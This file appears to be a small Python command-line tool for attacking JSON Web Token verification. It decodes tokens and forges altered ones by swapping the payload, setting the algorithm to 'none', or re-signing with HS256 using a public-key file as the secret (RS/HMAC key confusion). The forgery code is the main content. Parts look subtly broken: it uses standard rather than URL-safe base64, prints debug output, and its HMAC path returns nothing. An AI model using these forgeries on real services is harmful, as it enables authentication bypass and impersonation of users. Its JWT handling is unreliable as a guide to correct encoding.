import base64
import hashlib
import json
import click
import os.path
from os import path
import hmac


def signature(jwtJson, key):
    if jwtJson["header"]["alg"] == "HS256":
        signature = hmac.new(key.encode(), encodeJwt(jwtJson).encode(), hashlib.sha256).digest()
        click.echo(signature)
        click.echo("test: " + base64.b64encode(signature).decode('utf-8'))
        click.echo("header: " + encodeJwt(jwtJson))
        click.echo( encodeJwt(jwtJson) + "." +  base64.b64encode(signature).decode('utf-8'))


def encodedToJson(encodedString):
    decode = base64.b64decode(encodedString + '=' * (-len(encodedString) % 4))
    return json.loads(decode)


def encodeJwt(jwtJson):
    headerEncoded = base64.b64encode(json.dumps(jwtJson["header"]).encode('utf-8')).decode('utf-8')
    payloadEncoded = base64.b64encode(json.dumps(jwtJson["payload"]).encode('utf-8')).decode('utf-8')
    return headerEncoded + "." + payloadEncoded


def jwtToJson(jwt):
    jwtSplit = jwt.split('.')
    header = jwtSplit[0]
    payload = jwtSplit[1]
    signature = jwtSplit[2]
    headerJson = encodedToJson(header)
    payloadJson = encodedToJson(payload)
    return {"header": headerJson, "payload": payloadJson, "signature": signature}


def printDecoded(jwt):
    jwtJson = jwtToJson(jwt)
    click.echo(f"Header: {jwtJson['header']}")
    click.echo(f"Payload: {jwtJson['payload']}")
    click.echo(f"Signature: {jwtJson['signature']}")


def changeAlg(jwtJson, algo):
    jwtJson["header"]["alg"] = algo
    return jwtJson


def changePayload(jwtJson, payload):
    jwtJson["payload"] = payload
    return jwtJson


def checkHmac(jwtJson, file):
    jwtJson = changeAlg(jwtJson, "HS256")
    click.echo(type(encodeJwt(jwtJson)))
    return signature(jwtJson, open(file).read())


@click.command()
@click.argument('jwt')
@click.option("--print", is_flag=True, help="Print Decoded JWT")
@click.option("--payload", "-p", help="New payload json format")
@click.option("--none-vulnerability", '-none', is_flag=True, help="Check None Alg vulnerability")
@click.option("--hmac", help="Check RS/HMAC Alg vulnerability")
def main(jwt, print, payload, none_vulnerability, hmac):
    if payload:
        jwtJson = changePayload(jwtToJson(jwt), json.loads(payload))
        jwt = encodeJwt(jwtJson)
        click.echo(jwt)
    if hmac:
        if path.exists(hmac):
            jwt = checkHmac(jwtToJson(jwt), hmac)
            click.echo(jwt)
        else:
            click.echo("File not found")
    if none_vulnerability:
        jwtJson = changeAlg(jwtToJson(jwt), "none")
        jwt = encodeJwt(jwtJson) + "."
        click.echo(jwt)
    if print:
        printDecoded(jwt)


if __name__ == '__main__':
    main()
